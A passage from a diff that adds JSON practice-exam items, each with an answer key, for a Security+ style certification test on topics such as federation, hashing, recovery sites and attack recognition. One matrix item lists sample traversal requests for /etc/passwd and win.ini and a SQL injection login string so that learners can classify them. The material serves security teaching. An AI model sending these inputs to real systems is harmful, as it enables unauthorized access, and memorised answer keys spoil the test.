+    "format": "single",
+    "skill": "User behavior analytics",
+    "stem": "A user who normally works 9 to 5 suddenly downloads gigabytes of files at 2 a.m. Which capability is designed to flag this deviation?",
+    "options": [
+      "Signature-based antivirus",
+      "Port security",
+      "Certificate pinning",
+      "User behavior analytics"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "UBA baselines normal user activity and flags anomalies such as unusual hours or data volumes. Signature-based antivirus looks for known malware, not abnormal user behavior."
+  },
+  {
+    "id": "SECPLUS-T2-053",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Agreement types",
+    "stem": "Two universities sign a non-binding document expressing their mutual intent to share threat intelligence. Which agreement type is this?",
+    "options": [
+      "Master service agreement",
+      "Service-level agreement",
+      "Memorandum of agreement",
+      "Memorandum of understanding"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "An MOU states shared intent and is generally not legally binding. An MOA is more formal and defines specific responsibilities each party agrees to."
+  },
+  {
+    "id": "SECPLUS-T2-054",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Hardware security modules",
+    "stem": "A bank needs dedicated, tamper-resistant hardware to generate and store thousands of keys for its payment servers with high-speed cryptographic processing. Which solution is BEST?",
+    "options": [
+      "Trusted Platform Module chip",
+      "Secure enclave",
+      "Hardware security module",
+      "Key management system"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "An HSM is a dedicated, often network-attached appliance built to generate, store and use many keys at scale. A TPM is a chip on one motherboard that protects that single device's keys and boot integrity, not an enterprise key store."
+  },
+  {
+    "id": "SECPLUS-T2-055",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Data classification",
+    "stem": "Which data classification label is intended for information that can be released freely without harming the organization?",
+    "options": [
+      "Restricted",
+      "Public",
+      "Confidential",
+      "Critical"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Public data carries no harm if disclosed, such as marketing material. Restricted and confidential labels mark data whose disclosure would cause damage, and critical marks data essential to operations."
+  },
+  {
+    "id": "SECPLUS-T2-056",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Account deprovisioning",
+    "stem": "An employee was terminated yesterday, but the account is still active and was used to log in last night. Which process failed?",
+    "options": [
+      "Identity proofing during onboarding",
+      "Federation",
+      "Account deprovisioning",
+      "Password expiration"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Deprovisioning disables or removes accounts when users leave. Identity proofing verifies who a person is when the account is created, not when they depart."
+  },
+  {
+    "id": "SECPLUS-T2-057",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "DDoS amplification",
+    "stem": "A web server is flooded with large DNS ANY responses arriving from thousands of open resolvers, although the server never sent any DNS queries. Which attack is this?",
+    "options": [
+      "DNS cache poisoning",
+      "Domain hijacking",
+      "Amplified DDoS",
+      "Credential replay"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Attackers spoof the victim's address in small queries so open resolvers reflect much larger responses to it, an amplified and reflected DDoS. DNS poisoning corrupts resolver records rather than flooding a target."
+  },
+  {
+    "id": "SECPLUS-T2-058",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Agreement types",
+    "stem": "A company has a master contract with a consultant and now needs to define deliverables, timeline, and cost for one project. Which document should be issued?",
+    "options": [
+      "Memorandum of understanding",
+      "Statement of work",
+      "Master service agreement",
+      "Non-disclosure agreement"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A statement of work (work order) defines the scope, deliverables, and schedule of a specific engagement. The MSA already sets the general terms and is not reissued for each project."
+  },
+  {
+    "id": "SECPLUS-T2-059",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "High availability",
+    "stem": "Two database servers share storage, and one automatically takes over the workload when the other fails. Which high availability approach is this?",
+    "options": [
+      "Round-robin load balancing",
+      "Cold site recovery",
+      "Failover clustering",
+      "Platform diversity"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "A failover cluster has nodes that share resources and take over for a failed member. Load balancing is tempting, but it spreads requests across independent servers rather than handing a shared workload from one node to another."
+  },
+  {
+    "id": "SECPLUS-T2-060",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "SAML federation",
+    "stem": "Employees should sign in once with corporate credentials to reach a partner's SaaS application using XML-based assertions. Which standard supports this?",
+    "options": [
+      "LDAP",
+      "Kerberos",
+      "SAML",
+      "RADIUS"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "SAML exchanges XML assertions between an identity provider and a service provider for federated SSO. LDAP is a directory query protocol that does not federate across organizations."
+  },
+  {
+    "id": "SECPLUS-T2-061",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "DNS poisoning",
+    "stem": "Users typing the correct bank URL are sent to a fake site, and the local resolver's cache maps the bank's domain to an unfamiliar IP address. Which attack has occurred?",
+    "options": [
+      "Typosquatting",
+      "Watering hole attack",
+      "DNS cache poisoning",
+      "Brand impersonation campaign"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Corrupted resolver cache entries that send a correctly typed domain to an attacker's IP are DNS poisoning. Typosquatting relies on users typing a look-alike domain, which did not happen here."
+  },
+  {
+    "id": "SECPLUS-T2-062",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Data obfuscation",
+    "stem": "A merchant replaces stored credit card numbers with random substitute values and keeps the mapping in a separate secured vault. Which obfuscation technique is this?",
+    "options": [
+      "Data masking",
+      "Tokenization",
+      "Steganography",
+      "Hashing"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Tokenization swaps sensitive data for a random token and keeps the real value in a protected vault so authorized systems can retrieve it. Data masking hides part of a value, such as all but the last four digits, and does not map back to the original."
+  },
+  {
+    "id": "SECPLUS-T2-063",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Agreement types",
+    "stem": "Two companies form a joint venture and need a document defining profit sharing, responsibilities, and how decisions are made. Which agreement fits BEST?",
+    "options": [
+      "Non-disclosure agreement",
+      "Business partners agreement",
+      "Master service agreement and work order",
+      "Memorandum of understanding"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A BPA defines how partners share profits, responsibilities, and decision-making. An MOU expresses intent but does not govern ongoing profit and responsibility sharing."
+  },
+  {
+    "id": "SECPLUS-T2-064",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "OAuth",
+    "stem": "A mobile app needs permission to read a user's calendar from another service without ever receiving the user's password. Which protocol provides this delegated authorization?",
+    "options": [
+      "LDAP",
+      "SAML",
+      "TACACS+",
+      "OAuth"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "OAuth issues access tokens that grant limited, delegated access to resources without sharing credentials. SAML is mainly used for web SSO authentication assertions, not API authorization tokens."
+  },
+  {
+    "id": "SECPLUS-T2-065",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Recovery sites",
+    "stem": "A company needs a recovery site that already has hardware and network connectivity but needs recent data restored before operations resume. Which site type fits?",
+    "options": [
+      "Hot site",
+      "Cold site",
+      "Mobile site",
+      "Warm site"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A warm site has equipment and connectivity but not current data, balancing cost against recovery time. A hot site is fully mirrored and ready immediately, while a cold site has only space and power."
+  },
+  {
+    "id": "SECPLUS-T2-066",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "On-path attacks",
+    "stem": "A network monitor shows the default gateway's IP address suddenly mapped to a user workstation's MAC address, and that workstation is forwarding all subnet traffic. Which attack is underway?",
+    "options": [
+      "Wireless deauthentication",
+      "Credential replay",
+      "On-path attack",
+      "DNS amplification"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "ARP poisoning that makes a workstation impersonate the gateway places it on the path between hosts and the router. Deauthentication attacks knock wireless clients offline rather than relaying their traffic."
+  },
+  {
+    "id": "SECPLUS-T2-067",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Attribute-based access control",
+    "stem": "Access to a records system must depend on the user's department, the file's sensitivity, device compliance status, and time of request. Which model fits BEST?",
+    "options": [
+      "Discretionary access control",
+      "Role-based access control",
+      "Attribute-based access control",
+      "Mandatory access control"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "ABAC evaluates many attributes of subject, object, and environment in a policy. Role-based access control grants rights by job role alone and cannot weigh device or time attributes together."
+  },
+  {
+    "id": "SECPLUS-T2-068",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Vendor monitoring",
+    "stem": "After signing a contract, a company reviews its provider's quarterly SOC 2 reports and uptime figures against the SLA. Which activity is this?",
+    "options": [
+      "Due diligence",
+      "Vendor selection",
+      "Vendor monitoring",
+      "Supply chain analysis"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Ongoing review of a vendor's performance and assurance reports after contracting is vendor monitoring. Due diligence is the evaluation performed before the vendor is selected."
+  },
+  {
+    "id": "SECPLUS-T2-069",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Password salting",
+    "stem": "Attackers stole a password hash database and are cracking it quickly with precomputed rainbow tables. Which change would MOST directly defeat this technique for future hashes?",
+    "options": [
+      "Encrypting the database with AES",
+      "Storing hashes on a separate server",
+      "Requiring longer password expiration periods",
+      "Adding a unique salt to each password"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A unique random salt makes each hash different even for identical passwords, so precomputed rainbow tables no longer match. Encrypting the database protects it at rest but does not change how stolen hashes are cracked."
+  },
+  {
+    "id": "SECPLUS-T2-070",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Pass-the-hash",
+    "stem": "Domain controller logs show NTLM logons to many servers using an administrator's hash captured from a compromised workstation, without the password ever being typed. Which attack is this?",
+    "options": [
+      "Password spraying",
+      "Birthday collision attack",
+      "Pass-the-hash",
+      "Offline brute force attack"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Pass-the-hash is credential replay that reuses a captured NTLM hash to authenticate without knowing the password. Offline brute force would try to crack the hash, which was unnecessary here."
+  },
+  {
+    "id": "SECPLUS-T2-071",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "multi",
+    "skill": "Multifactor authentication",
+    "select": 2,
+    "stem": "Users currently sign in with a password only. Which TWO additions would each turn the login into multifactor authentication? (Choose two.)",
+    "options": [
+      "Fingerprint scan",
+      "Code from an authenticator app",
+      "Answer to a personal security question",
+      "A second, different password",
+      "Four-digit PIN"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "A fingerprint is something you are and an authenticator app code is something you have, each a different factor from the password. A security question, second password or PIN is just another something you know."
+  },
+  {
+    "id": "SECPLUS-T2-072",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Geographic dispersion",
+    "stem": "A company's primary data center and its backup site are located in the same coastal flood zone. Which resilience principle does this arrangement violate?",
+    "options": [
+      "Geographic dispersion",
+      "Platform diversity",
+      "Capacity planning",
+      "Journaling"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Geographic dispersion places sites far enough apart that one regional disaster cannot affect both. Platform diversity is tempting, but it concerns using different technologies, not different locations."
+  },
+  {
+    "id": "SECPLUS-T2-073",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Rules of engagement",
+    "stem": "Before a penetration test, the client and testers document approved targets, testing hours, out-of-scope systems, and emergency contacts. What is this document called?",
+    "options": [
+      "Service-level agreement",
+      "Non-disclosure agreement",
+      "Rules of engagement",
+      "Statement of work"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Rules of engagement define the scope, timing, and boundaries of a test. A statement of work covers deliverables and cost but not the detailed operating limits for testers."
+  },
+  {
+    "id": "SECPLUS-T2-074",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Password policy",
+    "stem": "Users bypass the password history rule by changing their password several times in a row to reuse an old one. Which setting BEST stops this?",
+    "options": [
+      "Maximum password age",
+      "Password complexity",
+      "Minimum password age",
+      "Account lockout threshold"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "A minimum password age prevents rapid successive changes that cycle through history. Maximum age forces changes but does not stop users from cycling back quickly."
+  },
+  {
+    "id": "SECPLUS-T2-075",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "matrix",
+    "skill": "Attack indicators",
+    "stem": "A WAF and the identity provider recorded the following entries. For each entry, select the attack it MOST likely indicates.",
+    "rows": [
+      "GET /view?file=../../../etc/passwd",
+      "user=admin' OR '1'='1 in a login form",
+      "One account, 4,000 failed passwords",
+      "600 accounts, one failed login each",
+      "GET /img?path=..%2f..%2fwin.ini"
+    ],
+    "columns": [
+      "SQL injection",
+      "Directory traversal",
+      "Password spraying",
+      "Brute force"
+    ],
+    "correct": [
+      1,
+      0,
+      3,
+      2,
+      1
+    ],
+    "explanation": "Dot-dot-slash sequences, plain or URL encoded as %2f, are directory traversal; a quote followed by OR '1'='1 is SQL injection. Many attempts against one account is brute force, while one common password tried across many accounts is spraying, which is easy to confuse with brute force."
+  },
+  {
+    "id": "SECPLUS-T2-076",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Multi-cloud",
+    "stem": "To avoid one provider outage taking down every service, a company runs the same workloads across two different public cloud providers. Which strategy is this?",
+    "options": [
+      "Hybrid cloud",
+      "Multi-cloud",
+      "Serverless architecture",
+      "Vertical scaling"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Multi-cloud uses more than one cloud provider to avoid dependence on a single vendor. Hybrid cloud is tempting, but it combines on-premises infrastructure with a cloud provider."
+  },
+  {
+    "id": "SECPLUS-T2-077",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Just-in-time access",
+    "stem": "Administrators hold permanent domain admin rights. The security team wants elevated rights granted only when needed and revoked automatically afterward. Which approach BEST fits?",
+    "options": [
+      "Password expiration every 30 days",
+      "Role-based access with standing admin groups",
+      "Just-in-time privileged access",
+      "A shared administrator account stored in a vault"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Just-in-time permissions in PAM grant temporary, time-limited elevation and remove standing privilege. A vaulted shared account still leaves permanent privilege in place."
+  },
+  {
+    "id": "SECPLUS-T2-078",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Supply chain analysis",
+    "stem": "A manufacturer evaluates whether a chip supplier's own component sources could introduce counterfeit or tampered parts. Which vendor assessment activity is this?",
+    "options": [
+      "Right-to-audit review",
+      "Penetration testing",
+      "Supply chain analysis",
+      "Vendor questionnaire"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Supply chain analysis examines risk introduced by a vendor's upstream suppliers. A questionnaire asks the vendor about its own controls and rarely reveals sub-supplier risk."
+  },
+  {
+    "id": "SECPLUS-T2-079",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 3,
+    "format": "multi",
+    "skill": "Password hashing",
+    "select": 2,
+    "stem": "Attackers who stole a password hash database are cracking it quickly with GPUs and precomputed tables. Which TWO changes would MOST directly slow cracking of future hashes? (Choose two.)",
+    "options": [
+      "Add a unique salt per password",
+      "Use a key stretching algorithm",
+      "Encode hashes with Base64",
+      "Switch from SHA-256 to MD5",
+      "Shorten the password expiration period"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "A unique salt defeats precomputed rainbow tables, and key stretching such as bcrypt or PBKDF2 makes every guess far slower. Base64 is only an encoding and adds no work for the attacker."
+  },
+  {
+    "id": "SECPLUS-T2-080",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Cross-site request forgery",
+    "stem": "While logged in to the company banking portal, a user opens a malicious page that silently submits a funds-transfer form using the user's active session. Which attack is this?",
+    "options": [
+      "Cross-site scripting",
+      "Privilege escalation",
+      "Server-side request forgery",
+      "Cross-site request forgery"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Cross-site request forgery abuses the victim's authenticated session so the browser submits an unwanted request. Server-side request forgery tricks the server, not the user's browser, into making requests."
+  },
+  {
+    "id": "SECPLUS-T2-081",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Automation benefits",
+    "stem": "A company scripts new-hire account creation, group membership, and mailbox setup, triggered from the HR system. Which benefit is MOST directly realized?",
+    "options": [
+      "Elimination of all technical debt",
+      "Removal of the need for audits",
+      "Lower complexity of the overall environment",
+      "Time savings and consistent provisioning"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Automating user provisioning saves time and applies the same configuration every time. Automation usually adds complexity and can create technical debt rather than eliminating it."
+  },
+  {
+    "id": "SECPLUS-T2-082",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Platform diversity",
+    "stem": "An architect runs the web tier on both Linux and Windows servers so that one operating system vulnerability cannot disable the entire service. Which concept is applied?",
+    "options": [
+      "Geographic dispersion",
+      "Capacity planning",
+      "Platform diversity",
+      "Continuity of operations"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Platform diversity uses different operating systems or vendors so a single flaw does not affect everything. Geographic dispersion is tempting, but it spreads systems across locations rather than across technologies."
+  },
+  {
+    "id": "SECPLUS-T2-083",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Non-compliance consequences",
+    "stem": "After repeated failed examinations, a regulator revokes a bank's authorization to operate in one state. Which consequence of non-compliance is this?",
+    "options": [
+      "Contractual impacts",
+      "Fines",
+      "Reputational damage",
+      "Loss of license"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Revoking authorization to operate is loss of license. Fines are monetary penalties and would not by themselves remove the right to operate."
+  },
+  {
+    "id": "SECPLUS-T2-084",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Downgrade attacks",
+    "stem": "A packet capture shows a client and server that both support TLS 1.2 negotiating SSL 3.0 after an intermediary stripped stronger cipher suites from the handshake. Which attack occurred?",
+    "options": [
+      "Birthday attack",
+      "Downgrade attack",
+      "Hash collision attack",
+      "Replay attack"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Forcing two capable parties onto a weaker, vulnerable protocol is a downgrade attack. A replay attack resends captured valid traffic rather than altering the handshake."
+  },
+  {
+    "id": "SECPLUS-T2-085",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Automation risks",
+    "stem": "A security team relies on one orchestration server to run every automated response playbook. Which concern should it raise FIRST?",
+    "options": [
+      "Employee retention",
+      "Single point of failure",
+      "Workforce multiplier effect",
+      "Reaction time"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "If the single orchestration server fails, every automated response stops. Employee retention, workforce multiplier, and reaction time are benefits of automation, not risks."
+  },
+  {
+    "id": "SECPLUS-T2-086",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Blockchain",
+    "stem": "Which technology records transactions in an open public ledger where each block contains the hash of the previous block, making tampering evident?",
+    "options": [
+      "Certificate revocation list",
+      "Key management system",
+      "Tokenization vault",
+      "Blockchain"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A blockchain is a distributed public ledger in which each block chains to the prior block's hash, so altering one block breaks every later block. A certificate revocation list is a CA-signed list of revoked certificates, not a chained ledger."
+  },
+  {
+    "id": "SECPLUS-T2-087",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Capacity planning",
+    "stem": "During continuity planning, a manager verifies that enough cross-trained staff exist to run critical systems if key employees are unavailable. Which capacity planning area is this?",
+    "options": [
+      "People",
+      "Technology",
+      "Infrastructure",
+      "Power"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Capacity planning covers people, technology and infrastructure, and staffing with adequate skills is the people element. Technology is tempting, but it refers to systems and software capacity, not personnel."
+  },
+  {
+    "id": "SECPLUS-T2-088",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Compliance monitoring",
+    "stem": "Every year, employees must confirm in writing that they have read and will follow the security policies. Which compliance monitoring element is this?",
+    "options": [
+      "Continuous automated compliance monitoring",
+      "Independent third-party audit",
+      "Due care",
+      "Attestation and acknowledgement"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Written confirmation that users understand and accept policies is attestation and acknowledgement. Due care is the ongoing effort to maintain protections, not a signed user statement."
+  },
+  {
+    "id": "SECPLUS-T2-089",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Birthday attacks",
+    "stem": "Which cryptographic attack exploits the high probability that two different inputs produce the same hash output, especially against short digests such as MD5?",
+    "options": [
+      "Downgrade attack",
+      "Replay attack",
+      "Password spraying",
+      "Birthday attack"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "The birthday attack uses the birthday paradox to find hash collisions far faster than brute force, so short digests are most at risk. A downgrade attack weakens protocol negotiation and does not target hash collisions."
+  },
+  {
+    "id": "SECPLUS-T2-090",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "order",
+    "skill": "Incident response",
+    "stem": "An analyst receives an alert that a file server may be infected with malware. Place the incident response phases in the order they should occur.",
+    "options": [
+      "Detection",
+      "Analysis",
+      "Containment",
+      "Eradication",
+      "Recovery",
+      "Lessons learned"
+    ],
+    "correct": [
+      0,
+      1,
+      2,
+      3,
+      4,
+      5
+    ],
+    "explanation": "The incident is detected and analyzed to confirm scope, then contained to stop spread before the malware is eradicated. Systems are recovered only after the cause is removed, and lessons learned closes the incident."
+  },
+  {
+    "id": "SECPLUS-D-001",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Tabletop exercises",
+    "stem": "Team members walk through a ransomware scenario in a conference room, discussing their roles without touching any systems. What is this activity?",
+    "options": [
+      "A simulation",
+      "A failover test",
+      "A tabletop exercise",
+      "A full-scale penetration test"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "A tabletop exercise is a discussion-based walkthrough of an incident plan. A simulation goes further by exercising realistic events, often with systems or injected activity."
+  },
+  {
+    "id": "SECPLUS-D-002",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Password spraying",
+    "stem": "Authentication logs show one failed login for each of 900 accounts within ten minutes, all from one IP and all trying Winter2026!, with no lockouts. Which attack is this?",
+    "options": [
+      "Brute force attack",
+      "Credential replay attack",
+      "Birthday attack",
+      "Password spraying"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Password spraying tries one common password across many accounts to stay under lockout thresholds. Brute force hammers a single account with many passwords and usually triggers account lockout."
+  },
+  {
+    "id": "SECPLUS-D-003",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 3,
+    "format": "matrix",
+    "skill": "Resilience testing",
+    "stem": "A company tests its recovery capabilities in several ways. For each activity, select the testing method it describes.",
+    "rows": [
+      "Staff talk through a scenario at a table",
+      "New system runs beside production on live data",
+      "Workloads shift to the standby cluster",
+      "Team responds to staged events on test systems"
+    ],
+    "columns": [
+      "Tabletop exercise",
+      "Simulation",
+      "Failover test",
+      "Parallel processing"
+    ],
+    "correct": [
+      0,
+      3,
+      2,
+      1
+    ],
+    "explanation": "A discussion-only walkthrough is a tabletop exercise, running the new system alongside production with live data is parallel processing, moving workloads to the standby is a failover test, and responding hands-on to staged events is a simulation. The simulation is easy to mistake for a tabletop, but a tabletop never touches systems."
+  },
+  {
+    "id": "SECPLUS-D-004",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Regulatory examinations",
+    "stem": "State examiners arrive at a credit union to review its security controls, documentation, and audit records. Which type of assessment is this?",
+    "options": [
+      "Penetration test",
+      "Internal compliance self-assessment",
+      "Audit committee review",
+      "Regulatory examination"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A review conducted by a government regulator is an external regulatory examination. A self-assessment is performed by the organization's own staff, not by examiners."
+  },
+  {
+    "id": "SECPLUS-D-005",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Certificate revocation",
+    "stem": "A browser must check whether a server's certificate has been revoked in real time without downloading a large list from the certificate authority. Which protocol does it use?",
+    "options": [
+      "OCSP",
+      "CRL",
+      "CSR",
+      "Kerberos"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "OCSP lets a client query the status of a single certificate in real time. A CRL must be downloaded in full and is only as current as its last publication."
+  },
+  {
+    "id": "SECPLUS-D-006",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Threat hunting",
+    "stem": "Without any alert being triggered, analysts proactively search logs for signs of an adversary using a newly reported technique. What is this activity?",
+    "options": [
+      "Root cause analysis",
+      "Alert tuning",
+      "Vulnerability scanning",
+      "Threat hunting"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Threat hunting is the proactive search for threats that evaded existing detections. Root cause analysis happens after an incident to determine why it occurred."
+  },
+  {
+    "id": "SECPLUS-D-007",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Indicators of compromise",
+    "select": 2,
+    "stem": "A SIEM shows these events for one user's account during a single morning. Which TWO are indicators that the account may be compromised? (Choose two.)",
+    "options": [
+      "Chicago and Singapore logins 18 minutes apart",
+      "Active sessions from two countries at once",
+      "Login from the office at 8:55 a.m.",
+      "Password reset after an expiry notice",
+      "VPN login from her usual home internet provider"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Logins too far apart to travel between are impossible travel, and simultaneous sessions from different countries are concurrent session usage; both are classic indicators. A password reset following an expiry notice is expected behavior."
+  },
+  {
+    "id": "SECPLUS-D-008",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Journaling",
+    "stem": "A database administrator must recover transactions up to the moment before a crash, beyond what the last full backup contains. Which technique enables this?",
+    "options": [
+      "Weekly offsite tape rotation",
+      "Journaling",
+      "A monthly virtual machine snapshot",
+      "Encrypting the backup media"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Journaling records each change as it occurs, so transactions can be replayed after restoring the last backup. Snapshots are tempting, but a monthly snapshot only captures one point in time."
+  },
+  {
+    "id": "SECPLUS-D-009",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Penetration testing",
+    "stem": "Testers receive network diagrams, source code, and valid credentials before assessing a web application. Which penetration testing environment is this?",
+    "options": [
+      "Integrated environment",
+      "Partially known environment",
+      "Known environment",
+      "Unknown environment"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Giving testers full information is a known (white box) environment test. A partially known environment provides only limited details, such as a network range."
+  },
+  {
+    "id": "SECPLUS-D-010",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Legal hold",
